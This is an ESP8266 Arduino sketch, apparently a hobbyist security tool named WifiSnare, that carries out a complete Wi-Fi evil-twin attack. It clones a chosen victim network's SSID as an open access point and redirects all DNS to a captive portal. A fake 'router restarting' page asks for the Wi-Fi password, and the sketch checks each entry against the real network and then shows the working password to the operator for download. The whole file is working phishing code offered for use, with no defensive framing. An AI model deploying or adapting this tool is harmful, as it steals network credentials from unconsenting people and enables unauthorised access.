/*
 * WifiSnare
 * It capture 2.4GHz wifi passwords using Evil-Twin attack.
 * Author - WireBits
 */

#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

DNSServer dnsServer;
const byte DNS_PORT = 53;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 6, 1);
IPAddress subNetMask(255, 255, 255, 0);

const char *ssid = "WiFiSnare";
const char *password = "wifisnare";

const int ledPin = 2;
String victimSSID = "";
String capturedPassword = "";
bool attackStarted = false;
bool correctPasswordEntered = false;

String credisetsSSIDPage() {
    String credisets = "<!DOCTYPE html>"
                       "<html lang='en'>"
                       "<head>"
                       "<meta charset='UTF-8'>"
                       "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                       "<title>WifiSnare</title>"
                       "<style>"
                       "body {color: white;justify-content: center;align-items: center;background-color: black;font-family: Arial, sans-serif;text-align: center;}"
                       "h2 {display: inline-block;border: 2px solid orange;border-radius: 5px;letter-spacing: 5px;padding: 10px;margin-bottom: 1rem;}"
                       "input[type='text'] {padding: 12px;margin: 5px 10px;border: 2px solid #7CB9E8;border-radius: 4px;background-color: #333;color: white;font-size: 16px;width: 60%;display: block;margin: 20px auto;}"
                       "button {color: white;padding: 12px 20px;margin: 5px 10px;border: none;border-radius: 4px;background-color: #00AB66;cursor: pointer;font-size: 16px;width: 40%;display: block;margin: 10px auto;}"
                       "button:hover {opacity: 0.8;}"
                       "hr {border: none;height: 2px;background-color: #FFC72C;margin: 20px auto;width: 90%;}"
                       "</style>"
                       "</head>"
                       "<body>"
                       "<h2>WifiSnare</h2>"
                       "<form method='post' action='/attack'>"
                       "<input type='text' name='victim_ssid' placeholder='Enter Victim SSID' required>"
                       "<button type='submit'>Start Attack</button>"
                       "</form>"
                       "<hr>";

    if (capturedPassword != "") {
        credisets += "<h1>Captured Credentials</h1>";
        credisets += "<p>SSID: " + victimSSID + "</p>";
        credisets += "<p>Password: " + capturedPassword + "</p>";
        credisets += "<button onclick=\"downloadPassword()\">Download Credentials</button>";
        credisets += "<script>";
        credisets += "function downloadPassword() {";
        credisets += " const ssid = '" + victimSSID + "';";
        credisets += " const password = '" + capturedPassword + "';";
        credisets += " const content = 'SSID: ' + ssid + '\\nPassword: ' + password;";
        credisets += " const blob = new Blob([content], { type: 'text/plain' });";
        credisets += " const link = document.createElement('a');";
        credisets += " link.href = URL.createObjectURL(blob);";
        credisets += " link.download = 'credentials.txt';";
        credisets += " document.body.appendChild(link);";
        credisets += " link.click();";
        credisets += " document.body.removeChild(link);";
        credisets += "}";
        credisets += "</script>";
    }

    credisets += "</body></html>";
    return credisets;
}

String phisingPage() {
    String victimPassword = "<!DOCTYPE html>"
                            "<html lang='en'>"
                            "<head>"
                            "<style>"
                            "body{color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
                            "nav{background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em;}"
                            "nav b{display: block; font-size: 1.5em; margin-bottom: 0.5em;}"
                            "div{padding: 0.5em;}"
                            "input[type='password']{width: 100%; padding: 10px; box-sizing: border-box;}"
                            "button{background-color: #232023; display: inline-block; height: 38px; padding: 0 20px; margin-top: 5px; color: white; text-align: center; font-size: 11px; font-weight: 600; line-height: 38px; letter-spacing: .1rem; background: #2f3136; border-radius: 4px; border: none; cursor: pointer; box-sizing: border-box;}"
                            "</style>"
                            "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                            "<title>" + victimSSID + " : Sign Up</title>"
                            "</head>"
                            "<body>"
                            "<nav><b>" + victimSSID + "</b>Router Info.</nav>"
                            "<div>Due to internal problems, the router is being restarted.<br>Enter password to re-connect to the network.</div>"
                            "<form method='post' action='/validate'>"
                            "<b>Password</b>"
                            "<center>"
                            "<input type='password' name='password'>"
                            "<button type='submit'>Sign Up</button>"
                            "</center>"
                            "</form>"
                            "<div><center>&#169; All rights reserved.</center></div>"
                            "</body>"
                            "</html>";

    return victimPassword;
}

String updatePage(bool success) {
    String updateMessage = "<!DOCTYPE html>"
                           "<html lang='en'>"
                           "<head>"
                           "<style>"
                           "body{color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
                           "nav{background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em;}"
                           "nav b{display: block; font-size: 1.5em; margin-bottom: 0.5em;}"
                           "div{padding: 0.5em;}"
                           "</style>"
                           "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                           "<title>" + victimSSID + " : Validation Panel</title>"
                           "</head>"
                           "<body>"
                           "<nav><b>" + victimSSID + "</b>Validation Panel</nav>";

    if (success) {
        updateMessage += "<div>Thank You.<br>Your router will restart soon.</div>";
    } else {
        updateMessage += "<div>Incorrect Password!<br>Please try again.</div>"
                         "<script>"
                         "setTimeout(function() {"
                         "    window.location.href = '/';"
                         "}, 3000);"
                         "</script>";
    }

    updateMessage += "<div><center>&#169; All rights reserved.</center></div>"
                     "</body>"
                     "</html>";

    return updateMessage;
}

void handleStartAttack() {
    victimSSID = webServer.arg("victim_ssid");
    attackStarted = true;
    correctPasswordEntered = false;
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    WiFi.softAP(victimSSID.c_str());
}

void handleIndex() {
    if (!attackStarted || correctPasswordEntered) {
        String html_data = credisetsSSIDPage();
        webServer.send(200, "text/html", html_data);
    } else {
        String html_data = phisingPage();
        webServer.send(200, "text/html", html_data);
    }
}

void handleValidation() {
    capturedPassword = webServer.arg("password");
    WiFi.disconnect();
    WiFi.begin(victimSSID.c_str(), capturedPassword.c_str());
    int attemptTime = 0;
    while (WiFi.status() != WL_CONNECTED && attemptTime < 15) {
        delay(1000);
        attemptTime++;
    }

    if (WiFi.status() == WL_CONNECTED) {
        correctPasswordEntered = true;
        String html_data = updatePage(true);
        webServer.send(200, "text/html", html_data);
        blinkLED(3);
        delay(2000);
        WiFi.softAPdisconnect(true);
        WiFi.softAP(ssid, password);
        attackStarted = false;
    } else {
        String html_data = updatePage(false);
        webServer.send(200, "text/html", html_data);
        blinkLED(2);
    }
}

void blinkLED(int times) {
    for (int i = 0; i < times; i++) {
        digitalWrite(ledPin, HIGH);
        delay(500);
        digitalWrite(ledPin, LOW);
        delay(500);
    }
}

void setup() {
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    WiFi.softAP(ssid, password);
    dnsServer.start(DNS_PORT, "*", apIP);
    webServer.on("/", handleIndex);
    webServer.on("/attack", handleStartAttack);
    webServer.on("/validate", handleValidation);
    webServer.begin();
}

void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();
}